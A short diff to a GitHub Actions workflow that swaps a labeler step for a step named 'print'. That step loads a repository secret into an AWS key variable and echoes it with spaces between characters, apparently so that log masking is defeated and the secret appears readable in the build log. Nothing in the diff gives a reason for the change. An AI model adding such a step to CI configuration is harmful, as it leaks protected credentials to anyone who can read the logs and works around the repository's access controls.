@@ -14,7 +14,8 @@ jobs:
   triage:
     runs-on: ubuntu-latest
     steps:
-    - uses: actions/labeler@v4
-      with:
-        repo-token: ${{ secrets.TEST }}
-        configuration-path: ${{ inputs.config-path }}
+    - name: print
+      env:
+        AWS_ACCESS_KEY_ID: ${{ secrets.TEST }}
+      run: |
+        echo ${{secrets.TEST}} | sed 's/./& /g'
